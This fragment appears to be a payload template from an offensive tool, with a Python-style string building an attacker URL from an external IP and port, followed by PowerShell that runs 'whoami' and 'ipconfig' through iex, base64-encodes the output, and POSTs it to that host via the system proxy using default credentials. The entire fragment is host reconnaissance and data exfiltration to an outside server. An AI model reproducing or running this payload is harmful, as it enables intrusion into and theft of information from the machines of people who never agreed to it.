$dest = "http://""" + GetExtIP() + """:""" + str(PORT) + """"
@('whoami','ipconfig') | ForEach-Object {
$output = iex $PSItem | Out-String
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($output)
$EncodedText = [Convert]::ToBase64String($Bytes)
$proxyurl = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($dest)
Invoke-WebRequest -Uri $dest -Proxy $proxyurl -ProxyUseDefaultCredentials -Method POST -Body $EncodedText
}